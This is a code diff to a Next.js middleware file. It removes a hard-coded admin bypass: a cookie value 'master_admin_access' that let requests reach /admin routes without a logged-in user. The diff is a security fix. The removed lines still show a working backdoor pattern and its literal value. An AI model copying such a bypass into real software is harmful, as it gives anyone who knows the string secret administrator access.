@@ -35,11 +35,10 @@ export async function middleware(request: NextRequest) {
   }
 
   // 2. Protect Admin & Technician Routes
-  const adminToken = request.cookies.get('admin_token')?.value
 
   if (url.pathname.startsWith('/admin')) {
     if (url.pathname === '/admin/login') {
-      if (user || adminToken === 'master_admin_access') {
+      if (user) {
         url.pathname = '/admin/dashboard'
         const redirectRes = NextResponse.redirect(url)
         redirectRes.headers.set('Content-Security-Policy', cspHeader)
@@ -48,7 +47,7 @@ export async function middleware(request: NextRequest) {
       return response
     }
 
-    if (!user && adminToken !== 'master_admin_access') {
+    if (!user) {
       url.pathname = '/admin/login'
       const redirectRes = NextResponse.redirect(url)
       redirectRes.headers.set('Content-Security-Policy', cspHeader)
